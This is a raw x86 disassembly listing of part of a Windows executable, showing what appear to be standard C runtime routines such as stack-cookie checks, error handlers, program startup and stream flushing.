  401bae:	call   DWORD PTR ds:0x40b000
  401bb4:	test   eax,eax
  401bb6:	jne    0x401c4b
  401bbc:	push   edi
  401bbd:	lea    eax,[ebp-0x118]
  401bc3:	push   eax
  401bc4:	lea    eax,[ebp-0x108]
  401bca:	push   eax
  401bcb:	lea    eax,[ebp-0x114]
  401bd1:	push   eax
  401bd2:	push   esi
  401bd3:	push   esi
  401bd4:	push   DWORD PTR [ebp-0x10c]
  401bda:	mov    edi,0x104
  401bdf:	mov    DWORD PTR [ebp-0x118],edi
  401be5:	mov    DWORD PTR [ebp-0x114],0x1
  401bef:	call   DWORD PTR ds:0x40b004
  401bf5:	test   eax,eax
  401bf7:	jne    0x401c3a
  401bf9:	cmp    DWORD PTR [ebp-0x114],0x2
  401c00:	mov    BYTE PTR [ebp-0x5],al
  401c03:	lea    eax,[ebp-0x108]
  401c09:	jne    0x401c24
  401c0b:	push   edi
  401c0c:	push   DWORD PTR [ebp-0x110]
  401c12:	push   eax
  401c13:	call   DWORD PTR ds:0x40b080
  401c19:	dec    eax
  401c1a:	lea    ecx,[edi-0x1]
  401c1d:	cmp    ecx,eax
  401c1f:	sbb    esi,esi
  401c21:	inc    esi
  401c22:	jmp    0x401c3a
  401c24:	push   eax
  401c25:	push   edi
  401c26:	push   DWORD PTR [ebp-0x110]
  401c2c:	call   0x401b13
  401c31:	xor    ecx,ecx
  401c33:	test   eax,eax
  401c35:	setge  cl
  401c38:	mov    esi,ecx
  401c3a:	push   DWORD PTR [ebp-0x10c]
  401c40:	call   DWORD PTR ds:0x40b008
  401c46:	mov    eax,esi
  401c48:	pop    edi
  401c49:	jmp    0x401c4d
  401c4b:	xor    eax,eax
  401c4d:	mov    ecx,DWORD PTR [ebp-0x4]
  401c50:	xor    ecx,ebp
  401c52:	pop    esi
  401c53:	call   0x401d11
  401c58:	leave  
  401c59:	ret    0x4
  401c5c:	mov    edi,edi
  401c5e:	push   ebp
  401c5f:	mov    ebp,esp
  401c61:	sub    esp,0x108
  401c67:	mov    eax,ds:0x40e004
  401c6c:	xor    eax,ebp
  401c6e:	mov    DWORD PTR [ebp-0x4],eax
  401c71:	mov    ecx,DWORD PTR ds:0x40ef0c
  401c77:	test   ecx,ecx
  401c79:	push   ebx
  401c7a:	mov    ebx,DWORD PTR [ebp+0xc]
  401c7d:	push   esi
  401c7e:	push   edi
  401c7f:	mov    edi,DWORD PTR [ebp+0x8]
  401c82:	jne    0x401cdb
  401c84:	cmp    DWORD PTR ds:0x40ef08,ecx
  401c8a:	jne    0x401cdb
  401c8c:	lea    eax,[ebp-0x108]
  401c92:	push   eax
  401c93:	call   0x401b76
  401c98:	test   eax,eax
  401c9a:	mov    esi,DWORD PTR ds:0x40b088
  401ca0:	je     0x401cb0
  401ca2:	lea    eax,[ebp-0x108]
  401ca8:	push   eax
  401ca9:	call   esi
  401cab:	mov    ds:0x40ef0c,eax
  401cb0:	mov    ecx,DWORD PTR ds:0x40ef0c
  401cb6:	test   ecx,ecx
  401cb8:	jne    0x401cdb
  401cba:	push   0x40b23c
  401cbf:	call   esi
  401cc1:	mov    ecx,eax
  401cc3:	test   ecx,ecx
  401cc5:	mov    DWORD PTR ds:0x40ef0c,ecx
  401ccb:	jne    0x401cdb
  401ccd:	mov    DWORD PTR ds:0x40ef08,0x1
  401cd7:	xor    eax,eax
  401cd9:	jmp    0x401d00
  401cdb:	mov    eax,ds:0x40ef04
  401ce0:	test   eax,eax
  401ce2:	jne    0x401cf6
  401ce4:	push   0xf
  401ce6:	push   ecx
  401ce7:	call   DWORD PTR ds:0x40b084
  401ced:	test   eax,eax
  401cef:	mov    ds:0x40ef04,eax
  401cf4:	je     0x401ccd
  401cf6:	push   DWORD PTR [ebp+0x14]
  401cf9:	push   DWORD PTR [ebp+0x10]
  401cfc:	push   ebx
  401cfd:	push   edi
  401cfe:	call   eax
  401d00:	mov    ecx,DWORD PTR [ebp-0x4]
  401d03:	pop    edi
  401d04:	pop    esi
  401d05:	xor    ecx,ebp
  401d07:	pop    ebx
  401d08:	call   0x401d11
  401d0d:	leave  
  401d0e:	ret    0x10
  401d11:	cmp    ecx,DWORD PTR ds:0x40e004
  401d17:	jne    0x401d1b
  401d19:	repz ret 
  401d1b:	jmp    0x402026
  401d20:	mov    edi,edi
  401d22:	push   ebp
  401d23:	mov    ebp,esp
  401d25:	lea    eax,[ebp+0x14]
  401d28:	push   eax
  401d29:	push   0x0
  401d2b:	push   DWORD PTR [ebp+0x10]
  401d2e:	push   DWORD PTR [ebp+0xc]
  401d31:	push   DWORD PTR [ebp+0x8]
  401d34:	call   0x4025f7
  401d39:	add    esp,0x14
  401d3c:	pop    ebp
  401d3d:	ret    
  401d3e:	mov    edi,edi
  401d40:	push   ebp
  401d41:	mov    ebp,esp
  401d43:	sub    esp,0x220
  401d49:	mov    eax,ds:0x40e004
  401d4e:	xor    eax,ebp
  401d50:	mov    DWORD PTR [ebp-0x4],eax
  401d53:	mov    eax,DWORD PTR [ebp+0x8]
  401d56:	or     DWORD PTR [ebp-0x21c],0xffffffff
  401d5d:	push   ebx
  401d5e:	xor    ebx,ebx
  401d60:	push   esi
  401d61:	lea    esi,[ebp-0x218]
  401d67:	mov    DWORD PTR [ebp-0x220],ebx
  401d6d:	cmp    eax,ebx
  401d6f:	jne    0x401d98
  401d71:	call   0x4024c9
  401d76:	mov    DWORD PTR [eax],ebx
  401d78:	call   0x4024b6
  401d7d:	push   ebx
  401d7e:	push   ebx
  401d7f:	push   ebx
  401d80:	push   ebx
  401d81:	push   ebx
  401d82:	mov    DWORD PTR [eax],0x16
  401d88:	call   0x40244e
  401d8d:	add    esp,0x14
  401d90:	or     eax,0xffffffff
  401d93:	jmp    0x401e68
  401d98:	push   edi
  401d99:	push   eax
  401d9a:	call   DWORD PTR ds:0x40b098
  401da0:	test   eax,eax
  401da2:	je     0x401e45
  401da8:	lea    eax,[ebp-0x218]
  401dae:	push   eax
  401daf:	push   0x105
  401db4:	call   DWORD PTR ds:0x40b094
  401dba:	mov    edi,eax
  401dbc:	cmp    edi,0x104
  401dc2:	jle    0x401df1
  401dc4:	lea    ebx,[edi+0x1]
  401dc7:	push   0x2
  401dc9:	push   ebx
  401dca:	call   0x40281d
  401dcf:	mov    esi,eax
  401dd1:	pop    ecx
  401dd2:	pop    ecx
  401dd3:	test   esi,esi
  401dd5:	je     0x401e43
  401dd7:	mov    DWORD PTR [ebp-0x220],0x1
  401de1:	test   edi,edi
  401de3:	je     0x401e43
  401de5:	push   esi
  401de6:	push   ebx
  401de7:	call   DWORD PTR ds:0x40b094
  401ded:	mov    edi,eax
  401def:	xor    ebx,ebx
  401df1:	cmp    edi,ebx
  401df3:	je     0x401e45
  401df5:	movzx  eax,WORD PTR [esi]
  401df8:	cmp    ax,0x5c
  401dfc:	je     0x401e04
  401dfe:	cmp    ax,0x2f
  401e02:	jne    0x401e0a
  401e04:	cmp    ax,WORD PTR [esi+0x2]
  401e08:	je     0x401e3b
  401e0a:	push   0x3d
  401e0c:	pop    eax
  401e0d:	mov    WORD PTR [ebp-0xc],ax
  401e11:	movzx  eax,WORD PTR [esi]
  401e14:	push   eax
  401e15:	call   0x4027c5
  401e1a:	pop    ecx
  401e1b:	push   0x3a
  401e1d:	mov    WORD PTR [ebp-0xa],ax
  401e21:	pop    eax
  401e22:	mov    WORD PTR [ebp-0x8],ax
  401e26:	xor    eax,eax
  401e28:	mov    WORD PTR [ebp-0x6],ax
  401e2c:	push   esi
  401e2d:	lea    eax,[ebp-0xc]
  401e30:	push   eax
  401e31:	call   DWORD PTR ds:0x40b090
  401e37:	test   eax,eax
  401e39:	je     0x401e45
  401e3b:	mov    DWORD PTR [ebp-0x21c],ebx
  401e41:	jmp    0x401e52
  401e43:	xor    ebx,ebx
  401e45:	call   DWORD PTR ds:0x40b08c
  401e4b:	push   eax
  401e4c:	call   0x4024dc
  401e51:	pop    ecx
  401e52:	pop    edi
  401e53:	cmp    DWORD PTR [ebp-0x220],ebx
  401e59:	je     0x401e62
  401e5b:	push   esi
  401e5c:	call   0x402682
  401e61:	pop    ecx
  401e62:	mov    eax,DWORD PTR [ebp-0x21c]
  401e68:	mov    ecx,DWORD PTR [ebp-0x4]
  401e6b:	pop    esi
  401e6c:	xor    ecx,ebp
  401e6e:	pop    ebx
  401e6f:	call   0x401d11
  401e74:	leave  
  401e75:	ret    
  401e76:	mov    edi,edi
  401e78:	push   ebp
  401e79:	mov    ebp,esp
  401e7b:	cmp    DWORD PTR ds:0x40ef18,0x1
  401e82:	jne    0x401e89
  401e84:	call   0x402dea
  401e89:	push   DWORD PTR [ebp+0x8]
  401e8c:	call   0x402c3f
  401e91:	push   0xff
  401e96:	call   0x40298b
  401e9b:	pop    ecx
  401e9c:	pop    ecx
  401e9d:	pop    ebp
  401e9e:	ret    
  401e9f:	push   0x58
  401ea1:	push   0x40c720
  401ea6:	call   0x403b74
  401eab:	xor    esi,esi
  401ead:	mov    DWORD PTR [ebp-0x4],esi
  401eb0:	lea    eax,[ebp-0x68]
  401eb3:	push   eax
  401eb4:	call   DWORD PTR ds:0x40b09c
  401eba:	push   0xfffffffe
  401ebc:	pop    edi
  401ebd:	mov    DWORD PTR [ebp-0x4],edi
  401ec0:	mov    eax,0x5a4d
  401ec5:	cmp    WORD PTR ds:0x400000,ax
  401ecc:	jne    0x401f06
  401ece:	mov    eax,ds:0x40003c
  401ed3:	cmp    DWORD PTR [eax+0x400000],0x4550
  401edd:	jne    0x401f06
  401edf:	mov    ecx,0x10b
  401ee4:	cmp    WORD PTR [eax+0x400018],cx
  401eeb:	jne    0x401f06
  401eed:	cmp    DWORD PTR [eax+0x400074],0xe
  401ef4:	jbe    0x401f06
  401ef6:	xor    ecx,ecx
  401ef8:	cmp    DWORD PTR [eax+0x4000e8],esi
  401efe:	setne  cl
  401f01:	mov    DWORD PTR [ebp-0x1c],ecx
  401f04:	jmp    0x401f09
  401f06:	mov    DWORD PTR [ebp-0x1c],esi
  401f09:	xor    ebx,ebx
  401f0b:	inc    ebx
  401f0c:	push   ebx
  401f0d:	call   0x403b41
  401f12:	pop    ecx
  401f13:	test   eax,eax
  401f15:	jne    0x401f1f
  401f17:	push   0x1c
  401f19:	call   0x401e76
  401f1e:	pop    ecx
  401f1f:	call   0x4039b4
  401f24:	test   eax,eax
  401f26:	jne    0x401f30
  401f28:	push   0x10
  401f2a:	call   0x401e76
  401f2f:	pop    ecx
  401f30:	call   0x403558
  401f35:	mov    DWORD PTR [ebp-0x4],ebx
  401f38:	call   0x403304
  401f3d:	test   eax,eax
  401f3f:	jge    0x401f49
  401f41:	push   0x1b
  401f43:	call   0x402937
  401f48:	pop    ecx
  401f49:	call   0x4032fe
  401f4e:	mov    ds:0x412578,eax
  401f53:	call   0x4032a7
  401f58:	mov    ds:0x40ef14,eax
  401f5d:	call   0x4031f9
  401f62:	test   eax,eax
  401f64:	jge    0x401f6e
  401f66:	push   0x8
  401f68:	call   0x402937
  401f6d:	pop    ecx
  401f6e:	call   0x402fca
  401f73:	test   eax,eax
  401f75:	jge    0x401f7f
  401f77:	push   0x9
  401f79:	call   0x402937
  401f7e:	pop    ecx
  401f7f:	push   ebx
  401f80:	call   0x4029f6
  401f85:	pop    ecx
  401f86:	cmp    eax,esi
  401f88:	je     0x401f91
  401f8a:	push   eax
  401f8b:	call   0x402937
  401f90:	pop    ecx
  401f91:	call   0x402f84
  401f96:	test   BYTE PTR [ebp-0x3c],bl
  401f99:	je     0x401fa1
  401f9b:	movzx  ecx,WORD PTR [ebp-0x38]
  401f9f:	jmp    0x401fa4
  401fa1:	push   0xa
  401fa3:	pop    ecx
  401fa4:	push   ecx
  401fa5:	push   eax
  401fa6:	push   esi
  401fa7:	push   0x400000
  401fac:	call   0x401000
  401fb1:	mov    DWORD PTR [ebp-0x20],eax
  401fb4:	cmp    DWORD PTR [ebp-0x1c],esi
  401fb7:	jne    0x401fbf
  401fb9:	push   eax
  401fba:	call   0x402ba7
  401fbf:	call   0x402bd3
  401fc4:	mov    DWORD PTR [ebp-0x4],edi
  401fc7:	jmp    0x401ffe
  401fc9:	mov    eax,DWORD PTR [ebp-0x14]
  401fcc:	mov    ecx,DWORD PTR [eax]
  401fce:	mov    ecx,DWORD PTR [ecx]
  401fd0:	mov    DWORD PTR [ebp-0x24],ecx
  401fd3:	push   eax
  401fd4:	push   ecx
  401fd5:	call   0x402e24
  401fda:	pop    ecx
  401fdb:	pop    ecx
  401fdc:	ret    
  401fdd:	mov    esp,DWORD PTR [ebp-0x18]
  401fe0:	mov    eax,DWORD PTR [ebp-0x24]
  401fe3:	mov    DWORD PTR [ebp-0x20],eax
  401fe6:	cmp    DWORD PTR [ebp-0x1c],0x0
  401fea:	jne    0x401ff2
  401fec:	push   eax
  401fed:	call   0x402bbd
  401ff2:	call   0x402be2
  401ff7:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  401ffe:	mov    eax,DWORD PTR [ebp-0x20]
  402001:	jmp    0x402016
  402003:	xor    eax,eax
  402005:	inc    eax
  402006:	ret    
  402007:	mov    esp,DWORD PTR [ebp-0x18]
  40200a:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  402011:	mov    eax,0xff
  402016:	call   0x403bb9
  40201b:	ret    
  40201c:	call   0x403d5c
  402021:	jmp    0x401e9f
  402026:	mov    edi,edi
  402028:	push   ebp
  402029:	mov    ebp,esp
  40202b:	sub    esp,0x328
  402031:	mov    ds:0x40f028,eax
  402036:	mov    DWORD PTR ds:0x40f024,ecx
  40203c:	mov    DWORD PTR ds:0x40f020,edx
  402042:	mov    DWORD PTR ds:0x40f01c,ebx
  402048:	mov    DWORD PTR ds:0x40f018,esi
  40204e:	mov    DWORD PTR ds:0x40f014,edi
  402054:	data16 mov WORD PTR ds:0x40f040,ss
  40205b:	data16 mov WORD PTR ds:0x40f034,cs
  402062:	data16 mov WORD PTR ds:0x40f010,ds
  402069:	data16 mov WORD PTR ds:0x40f00c,es
  402070:	data16 mov WORD PTR ds:0x40f008,fs
  402077:	data16 mov WORD PTR ds:0x40f004,gs
  40207e:	pushf  
  40207f:	pop    DWORD PTR ds:0x40f038
  402085:	mov    eax,DWORD PTR [ebp+0x0]
  402088:	mov    ds:0x40f02c,eax
  40208d:	mov    eax,DWORD PTR [ebp+0x4]
  402090:	mov    ds:0x40f030,eax
  402095:	lea    eax,[ebp+0x8]
  402098:	mov    ds:0x40f03c,eax
  40209d:	mov    eax,DWORD PTR [ebp-0x320]
  4020a3:	mov    DWORD PTR ds:0x40ef78,0x10001
  4020ad:	mov    eax,ds:0x40f030
  4020b2:	mov    ds:0x40ef2c,eax
  4020b7:	mov    DWORD PTR ds:0x40ef20,0xc0000409
  4020c1:	mov    DWORD PTR ds:0x40ef24,0x1
  4020cb:	mov    eax,ds:0x40e004
  4020d0:	mov    DWORD PTR [ebp-0x328],eax
  4020d6:	mov    eax,ds:0x40e008
  4020db:	mov    DWORD PTR [ebp-0x324],eax
  4020e1:	call   DWORD PTR ds:0x40b0b0
  4020e7:	mov    ds:0x40ef70,eax
  4020ec:	push   0x1
  4020ee:	call   0x403df2
  4020f3:	pop    ecx
  4020f4:	push   0x0
  4020f6:	call   DWORD PTR ds:0x40b0ac
  4020fc:	push   0x40b284
  402101:	call   DWORD PTR ds:0x40b0a8
  402107:	cmp    DWORD PTR ds:0x40ef70,0x0
  40210e:	jne    0x402118
  402110:	push   0x1
  402112:	call   0x403df2
  402117:	pop    ecx
  402118:	push   0xc0000409
  40211d:	call   DWORD PTR ds:0x40b0a4
  402123:	push   eax
  402124:	call   DWORD PTR ds:0x40b0a0
  40212a:	leave  
  40212b:	ret    
  40212c:	mov    edi,edi
  40212e:	push   ebp
  40212f:	mov    ebp,esp
  402131:	push   ecx
  402132:	push   esi
  402133:	mov    esi,DWORD PTR [ebp+0xc]
  402136:	push   esi
  402137:	call   0x404a09
  40213c:	mov    DWORD PTR [ebp+0xc],eax
  40213f:	mov    eax,DWORD PTR [esi+0xc]
  402142:	pop    ecx
  402143:	test   al,0x82
  402145:	jne    0x40215e
  402147:	call   0x4024b6
  40214c:	mov    DWORD PTR [eax],0x9
  402152:	or     DWORD PTR [esi+0xc],0x20
  402156:	or     eax,0xffffffff
  402159:	jmp    0x40228d
  40215e:	test   al,0x40
  402160:	je     0x40216f
  402162:	call   0x4024b6
  402167:	mov    DWORD PTR [eax],0x22
  40216d:	jmp    0x402152
  40216f:	push   ebx
  402170:	xor    ebx,ebx
  402172:	test   al,0x1
  402174:	je     0x40218c
  402176:	mov    DWORD PTR [esi+0x4],ebx
  402179:	test   al,0x10
  40217b:	je     0x402208
  402181:	mov    ecx,DWORD PTR [esi+0x8]
  402184:	and    eax,0xfffffffe
  402187:	mov    DWORD PTR [esi],ecx
  402189:	mov    DWORD PTR [esi+0xc],eax
  40218c:	mov    eax,DWORD PTR [esi+0xc]
  40218f:	and    eax,0xffffffef
  402192:	or     eax,0x2
  402195:	mov    DWORD PTR [esi+0xc],eax
  402198:	mov    DWORD PTR [esi+0x4],ebx
  40219b:	mov    DWORD PTR [ebp-0x4],ebx
  40219e:	test   eax,0x10c
  4021a3:	jne    0x4021d1
  4021a5:	call   0x404854
  4021aa:	add    eax,0x20
  4021ad:	cmp    esi,eax
  4021af:	je     0x4021bd
  4021b1:	call   0x404854
  4021b6:	add    eax,0x40
  4021b9:	cmp    esi,eax
  4021bb:	jne    0x4021ca
  4021bd:	push   DWORD PTR [ebp+0xc]
  4021c0:	call   0x4047f0
  4021c5:	pop    ecx
  4021c6:	test   eax,eax
  4021c8:	jne    0x4021d1
  4021ca:	push   esi
  4021cb:	call   0x4047a7
  4021d0:	pop    ecx
  4021d1:	test   DWORD PTR [esi+0xc],0x108
  4021d8:	push   edi
  4021d9:	je     0x40225f
  4021df:	mov    eax,DWORD PTR [esi+0x8]
  4021e2:	mov    edi,DWORD PTR [esi]
  4021e4:	lea    ecx,[eax+0x1]
  4021e7:	mov    DWORD PTR [esi],ecx
  4021e9:	mov    ecx,DWORD PTR [esi+0x18]
  4021ec:	sub    edi,eax
  4021ee:	dec    ecx
  4021ef:	cmp    edi,ebx
  4021f1:	mov    DWORD PTR [esi+0x4],ecx
  4021f4:	jle    0x402213
  4021f6:	push   edi
  4021f7:	push   eax
  4021f8:	push   DWORD PTR [ebp+0xc]
  4021fb:	call   0x4046cb
  402200:	add    esp,0xc
  402203:	mov    DWORD PTR [ebp-0x4],eax
  402206:	jmp    0x402255
  402208:	or     eax,0x20
  40220b:	mov    DWORD PTR [esi+0xc],eax
  40220e:	or     eax,0xffffffff
  402211:	jmp    0x40228c
  402213:	mov    ecx,DWORD PTR [ebp+0xc]
  402216:	cmp    ecx,0xffffffff
  402219:	je     0x402236
  40221b:	cmp    ecx,0xfffffffe
  40221e:	je     0x402236
  402220:	mov    eax,ecx
  402222:	and    eax,0x1f
  402225:	mov    edx,ecx
  402227:	sar    edx,0x5
  40222a:	shl    eax,0x6
  40222d:	add    eax,DWORD PTR [edx*4+0x412460]
  402234:	jmp    0x40223b
  402236:	mov    eax,0x40e250
  40223b:	test   BYTE PTR [eax+0x4],0x20
  40223f:	je     0x402255
  402241:	push   0x2
  402243:	push   ebx
  402244:	push   ebx
  402245:	push   ecx
  402246:	call   0x403e7f
  40224b:	and    eax,edx
  40224d:	add    esp,0x10
  402250:	cmp    eax,0xffffffff
  402253:	je     0x40227a
  402255:	mov    eax,DWORD PTR [esi+0x8]
  402258:	mov    cl,BYTE PTR [ebp+0x8]
  40225b:	mov    BYTE PTR [eax],cl
  40225d:	jmp    0x402275
  40225f:	xor    edi,edi
  402261:	inc    edi
  402262:	push   edi
  402263:	lea    eax,[ebp+0x8]
  402266:	push   eax
  402267:	push   DWORD PTR [ebp+0xc]
  40226a:	call   0x4046cb
  40226f:	add    esp,0xc
  402272:	mov    DWORD PTR [ebp-0x4],eax
  402275:	cmp    DWORD PTR [ebp-0x4],edi
  402278:	je     0x402283
  40227a:	or     DWORD PTR [esi+0xc],0x20
  40227e:	or     eax,0xffffffff
  402281:	jmp    0x40228b
  402283:	mov    eax,DWORD PTR [ebp+0x8]
  402286:	and    eax,0xff
  40228b:	pop    edi
  40228c:	pop    ebx
  40228d:	pop    esi
  40228e:	leave  
  40228f:	ret    
  402290:	mov    edi,edi
  402292:	push   ebp
  402293:	mov    ebp,esp
  402295:	mov    eax,DWORD PTR [ebp+0x8]
  402298:	push   esi
  402299:	mov    esi,ecx
  40229b:	mov    BYTE PTR [esi+0xc],0x0
  40229f:	test   eax,eax
  4022a1:	jne    0x402306
  4022a3:	call   0x40386b
  4022a8:	mov    DWORD PTR [esi+0x8],eax
  4022ab:	mov    ecx,DWORD PTR [eax+0x6c]
  4022ae:	mov    DWORD PTR [esi],ecx
  4022b0:	mov    ecx,DWORD PTR [eax+0x68]
  4022b3:	mov    DWORD PTR [esi+0x4],ecx
  4022b6:	mov    ecx,DWORD PTR [esi]
  4022b8:	cmp    ecx,DWORD PTR ds:0x40eb28
  4022be:	je     0x4022d2
  4022c0:	mov    ecx,DWORD PTR ds:0x40ea44
  4022c6:	test   DWORD PTR [eax+0x70],ecx
  4022c9:	jne    0x4022d2
  4022cb:	call   0x4053d0
  4022d0:	mov    DWORD PTR [esi],eax
  4022d2:	mov    eax,DWORD PTR [esi+0x4]
  4022d5:	cmp    eax,DWORD PTR ds:0x40e948
  4022db:	je     0x4022f3
  4022dd:	mov    eax,DWORD PTR [esi+0x8]
  4022e0:	mov    ecx,DWORD PTR ds:0x40ea44
  4022e6:	test   DWORD PTR [eax+0x70],ecx
  4022e9:	jne    0x4022f3
  4022eb:	call   0x404c61
  4022f0:	mov    DWORD PTR [esi+0x4],eax
  4022f3:	mov    eax,DWORD PTR [esi+0x8]
  4022f6:	test   BYTE PTR [eax+0x70],0x2
  4022fa:	jne    0x402310
  4022fc:	or     DWORD PTR [eax+0x70],0x2
  402300:	mov    BYTE PTR [esi+0xc],0x1
  402304:	jmp    0x402310
  402306:	mov    ecx,DWORD PTR [eax]
  402308:	mov    DWORD PTR [esi],ecx
  40230a:	mov    eax,DWORD PTR [eax+0x4]
  40230d:	mov    DWORD PTR [esi+0x4],eax
  402310:	mov    eax,esi
  402312:	pop    esi
  402313:	pop    ebp
  402314:	ret    0x4
  402317:	mov    edi,edi
  402319:	push   ebp
  40231a:	mov    ebp,esp
  40231c:	mov    eax,DWORD PTR [ebp+0x8]
  40231f:	mov    ds:0x40f244,eax
  402324:	pop    ebp
  402325:	ret    
  402326:	mov    edi,edi
  402328:	push   ebp
  402329:	mov    ebp,esp
  40232b:	sub    esp,0x328
  402331:	mov    eax,ds:0x40e004
  402336:	xor    eax,ebp
  402338:	mov    DWORD PTR [ebp-0x4],eax
  40233b:	and    DWORD PTR [ebp-0x328],0x0
  402342:	push   ebx
  402343:	push   0x4c
  402345:	lea    eax,[ebp-0x324]
  40234b:	push   0x0
  40234d:	push   eax
  40234e:	call   0x4058c0
  402353:	lea    eax,[ebp-0x328]
  402359:	mov    DWORD PTR [ebp-0x2d8],eax
  40235f:	lea    eax,[ebp-0x2d0]
  402365:	add    esp,0xc
  402368:	mov    DWORD PTR [ebp-0x2d4],eax
  40236e:	mov    DWORD PTR [ebp-0x220],eax
  402374:	mov    DWORD PTR [ebp-0x224],ecx
  40237a:	mov    DWORD PTR [ebp-0x228],edx
  402380:	mov    DWORD PTR [ebp-0x22c],ebx
  402386:	mov    DWORD PTR [ebp-0x230],esi
  40238c:	mov    DWORD PTR [ebp-0x234],edi
  402392:	data16 mov WORD PTR [ebp-0x208],ss
  402399:	data16 mov WORD PTR [ebp-0x214],cs
  4023a0:	data16 mov WORD PTR [ebp-0x238],ds
  4023a7:	data16 mov WORD PTR [ebp-0x23c],es
  4023ae:	data16 mov WORD PTR [ebp-0x240],fs
  4023b5:	data16 mov WORD PTR [ebp-0x244],gs
  4023bc:	pushf  
  4023bd:	pop    DWORD PTR [ebp-0x210]
  4023c3:	mov    eax,DWORD PTR [ebp+0x4]
  4023c6:	lea    ecx,[ebp+0x4]
  4023c9:	mov    DWORD PTR [ebp-0x2d0],0x10001
  4023d3:	mov    DWORD PTR [ebp-0x218],eax
  4023d9:	mov    DWORD PTR [ebp-0x20c],ecx
  4023df:	mov    ecx,DWORD PTR [ecx-0x4]
  4023e2:	mov    DWORD PTR [ebp-0x21c],ecx
  4023e8:	mov    DWORD PTR [ebp-0x328],0xc0000417
  4023f2:	mov    DWORD PTR [ebp-0x324],0x1
  4023fc:	mov    DWORD PTR [ebp-0x31c],eax
  402402:	call   DWORD PTR ds:0x40b0b0
  402408:	push   0x0
  40240a:	mov    ebx,eax
  40240c:	call   DWORD PTR ds:0x40b0ac
  402412:	lea    eax,[ebp-0x2d8]
  402418:	push   eax
  402419:	call   DWORD PTR ds:0x40b0a8
  40241f:	test   eax,eax
  402421:	jne    0x40242f
  402423:	test   ebx,ebx
  402425:	jne    0x40242f
  402427:	push   0x2
  402429:	call   0x403df2
  40242e:	pop    ecx
  40242f:	push   0xc0000417
  402434:	call   DWORD PTR ds:0x40b0a4
  40243a:	push   eax
  40243b:	call   DWORD PTR ds:0x40b0a0
  402441:	mov    ecx,DWORD PTR [ebp-0x4]
  402444:	xor    ecx,ebp
  402446:	pop    ebx
  402447:	call   0x401d11
  40244c:	leave  
  40244d:	ret    
  40244e:	mov    edi,edi
  402450:	push   ebp
  402451:	mov    ebp,esp
  402453:	push   DWORD PTR ds:0x40f244
  402459:	call   0x40361f
  40245e:	pop    ecx
  40245f:	test   eax,eax
  402461:	je     0x402466
  402463:	pop    ebp
  402464:	jmp    eax
  402466:	push   0x2
  402468:	call   0x403df2
  40246d:	pop    ecx
  40246e:	pop    ebp
  40246f:	jmp    0x402326
  402474:	mov    edi,edi
  402476:	push   ebp
  402477:	mov    ebp,esp
  402479:	mov    eax,DWORD PTR [ebp+0x8]
  40247c:	xor    ecx,ecx
  40247e:	cmp    eax,DWORD PTR [ecx*8+0x40e010]
  402485:	je     0x40249a
  402487:	inc    ecx
  402488:	cmp    ecx,0x2d
  40248b:	jb     0x40247e
  40248d:	lea    ecx,[eax-0x13]
  402490:	cmp    ecx,0x11
  402493:	ja     0x4024a3
  402495:	push   0xd
  402497:	pop    eax
  402498:	pop    ebp
  402499:	ret    
  40249a:	mov    eax,DWORD PTR [ecx*8+0x40e014]
  4024a1:	pop    ebp
  4024a2:	ret    
  4024a3:	add    eax,0xffffff44
  4024a8:	push   0xe
  4024aa:	pop    ecx
  4024ab:	cmp    ecx,eax
  4024ad:	sbb    eax,eax
  4024af:	and    eax,ecx
  4024b1:	add    eax,0x8
  4024b4:	pop    ebp
  4024b5:	ret    
  4024b6:	call   0x4037f2
  4024bb:	test   eax,eax
  4024bd:	jne    0x4024c5
  4024bf:	mov    eax,0x40e178
  4024c4:	ret    
  4024c5:	add    eax,0x8
  4024c8:	ret    
  4024c9:	call   0x4037f2
  4024ce:	test   eax,eax
  4024d0:	jne    0x4024d8
  4024d2:	mov    eax,0x40e17c
  4024d7:	ret    
  4024d8:	add    eax,0xc
  4024db:	ret    
  4024dc:	mov    edi,edi
  4024de:	push   ebp
  4024df:	mov    ebp,esp
  4024e1:	push   esi
  4024e2:	call   0x4024c9
  4024e7:	mov    ecx,DWORD PTR [ebp+0x8]
  4024ea:	push   ecx
  4024eb:	mov    DWORD PTR [eax],ecx
  4024ed:	call   0x402474
  4024f2:	pop    ecx
  4024f3:	mov    esi,eax
  4024f5:	call   0x4024b6
  4024fa:	mov    DWORD PTR [eax],esi
  4024fc:	pop    esi
  4024fd:	pop    ebp
  4024fe:	ret    
  4024ff:	mov    edi,edi
  402501:	push   ebp
  402502:	mov    ebp,esp
  402504:	sub    esp,0x20
  402507:	push   ebx
  402508:	xor    ebx,ebx
  40250a:	cmp    DWORD PTR [ebp+0x14],ebx
  40250d:	jne    0x40252f
  40250f:	call   0x4024b6
  402514:	push   ebx
  402515:	push   ebx
  402516:	push   ebx
  402517:	push   ebx
  402518:	push   ebx
  402519:	mov    DWORD PTR [eax],0x16
  40251f:	call   0x40244e
  402524:	add    esp,0x14
  402527:	or     eax,0xffffffff
  40252a:	jmp    0x4025f4
  40252f:	push   esi
  402530:	mov    esi,DWORD PTR [ebp+0xc]
  402533:	push   edi
  402534:	mov    edi,DWORD PTR [ebp+0x10]
  402537:	cmp    edi,ebx
  402539:	je     0x40255f
  40253b:	cmp    esi,ebx
  40253d:	jne    0x40255f
  40253f:	call   0x4024b6
  402544:	push   ebx
  402545:	push   ebx
  402546:	push   ebx
  402547:	push   ebx
  402548:	push   ebx
  402549:	mov    DWORD PTR [eax],0x16
  40254f:	call   0x40244e
  402554:	add    esp,0x14
  402557:	or     eax,0xffffffff
  40255a:	jmp    0x4025f2
  40255f:	mov    DWORD PTR [ebp-0x14],0x42
  402566:	mov    DWORD PTR [ebp-0x18],esi
  402569:	mov    DWORD PTR [ebp-0x20],esi
  40256c:	cmp    edi,0x3fffffff
  402572:	jbe    0x40257d
  402574:	mov    DWORD PTR [ebp-0x1c],0x7fffffff
  40257b:	jmp    0x402583
  40257d:	lea    eax,[edi+edi*1]
  402580:	mov    DWORD PTR [ebp-0x1c],eax
  402583:	push   DWORD PTR [ebp+0x1c]
  402586:	lea    eax,[ebp-0x20]
  402589:	push   DWORD PTR [ebp+0x18]
  40258c:	push   DWORD PTR [ebp+0x14]
  40258f:	push   eax
  402590:	call   DWORD PTR [ebp+0x8]
  402593:	add    esp,0x10
  402596:	mov    DWORD PTR [ebp+0x14],eax
  402599:	cmp    esi,ebx
  40259b:	je     0x4025f2
  40259d:	cmp    eax,ebx
  40259f:	jl     0x4025e3
  4025a1:	dec    DWORD PTR [ebp-0x1c]
  4025a4:	js     0x4025b0
